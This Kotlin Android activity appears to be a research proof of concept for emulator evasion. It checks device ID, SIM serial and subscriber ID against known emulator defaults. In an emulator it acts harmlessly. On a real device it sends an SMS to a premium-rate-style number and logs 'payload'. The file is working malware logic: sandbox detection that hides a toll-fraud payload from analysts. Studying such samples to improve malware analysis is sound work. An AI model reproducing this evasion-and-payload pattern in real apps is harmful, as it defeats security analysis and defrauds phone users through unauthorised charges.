package de.fraunhofer.fkie.divbyid

import android.Manifest.permission.SEND_SMS
import android.os.Bundle
import android.telephony.SmsManager
import android.telephony.TelephonyManager
import android.util.Log
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import de.fraunhofer.fkie.divbyid.databinding.ActivityMainBinding


class MainActivity : AppCompatActivity() {

    private lateinit var binding: ActivityMainBinding

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        ActivityCompat.requestPermissions(this, arrayOf(SEND_SMS), 1)

        Log.i("evadroid", "start")

        if (isEmulator()) {
            Toast.makeText(this, "harmless behavior.", Toast.LENGTH_LONG).show()
            Log.i("evadroid", "harmless behavior")
        } else {
            val sms = SmsManager.getDefault()
            sms.sendTextMessage("+1-900-IM-SO-EVIL", null, "message", null, null)
            Toast.makeText(this, "Payload triggered!", Toast.LENGTH_LONG).show()
            Log.i("evadroid", "payload")
        }
        Log.i("evadroid", "end")
    }

    private fun isEmulator(): Boolean {
        val tm = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
        val getDeviceId = tm.deviceId //000000000000000
        val getSimSerialNumber = tm.simSerialNumber// 89014103211118510720
        val getSubscriberId = tm.subscriberId// 310260000000000
        Log.d("evadroid", String.format("getDeviceId         : %s", getDeviceId));
        Log.d("evadroid", String.format("getSimSerialNumber  : %s", getSimSerialNumber));
        Log.d("evadroid", String.format("getSubscriberId     : %s", getSubscriberId));

        if (getDeviceId.matches(Regex("0*"))) {
            return true
        }
        if (getSimSerialNumber.equals("89014103211118510720")) {
            return true
        }
        if (getSubscriberId.contains("00000")) {
            return true
        }

        return false;
    }
}